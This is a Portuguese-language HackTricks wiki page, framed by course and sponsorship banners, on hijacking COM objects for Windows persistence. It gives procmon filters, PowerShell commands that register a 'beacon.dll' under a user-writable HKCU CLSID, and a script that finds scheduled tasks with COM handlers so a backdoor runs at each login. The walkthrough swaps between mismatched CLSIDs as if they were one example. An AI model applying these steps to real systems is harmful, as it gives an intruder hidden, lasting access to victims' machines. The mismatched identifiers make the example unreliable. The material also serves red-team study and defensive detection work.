# Apropriação de COM

<details>

<summary><strong>Aprenda hacking AWS do zero ao avançado com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>

### Pesquisando componentes COM inexistentes

Como os valores de HKCU podem ser modificados pelos usuários, a **Apropriação de COM** pode ser usada como um **mecanismo persistente**. Usando `procmon`, é fácil encontrar registros COM pesquisados que não existem e que um atacante poderia criar para persistir. Filtros:

* Operações **RegOpenKey**.
* onde o _Resultado_ é **NOME NÃO ENCONTRADO**.
* e o _Caminho_ termina com **InprocServer32**.

Depois de decidir qual COM inexistente impersoanar, execute os seguintes comandos. _Tenha cuidado se decidir impersoanar um COM que é carregado a cada poucos segundos, pois isso pode ser excessivo._&#x20;
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Componentes COM do Agendador de Tarefas suscetíveis a sequestro

As Tarefas do Windows usam Acionadores Personalizados para chamar objetos COM e, como são executadas através do Agendador de Tarefas, é mais fácil prever quando serão acionadas.

<pre class="language-powershell"><code class="lang-powershell"># Mostrar CLSIDs COM
$Tarefas = Get-ScheduledTask

foreach ($Tarefa in $Tarefas)
{
if ($Tarefa.Actions.ClassId -ne $null)
{
if ($Tarefa.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Tarefa.Principal.GroupId -eq $usersGroup)
{
Write-Host "Nome da Tarefa: " $Tarefa.TaskName
Write-Host "Caminho da Tarefa: " $Tarefa.TaskPath
Write-Host "CLSID: " $Tarefa.Actions.ClassId
Write-Host
}
}
}
}

# Saída de Exemplo:
<strong># Nome da Tarefa:  Exemplo
</strong># Caminho da Tarefa:  \Microsoft\Windows\Exemplo\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [mais como o anterior...]</code></pre>

Verificando a saída, você pode selecionar uma que será executada **sempre que um usuário fizer login**, por exemplo.

Agora, procurando pelo CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** em **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** e em HKLM e HKCU, geralmente você descobrirá que o valor não existe em HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Então, você pode simplesmente criar a entrada HKCU e toda vez que o usuário fizer login, sua porta dos fundos será acionada.

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
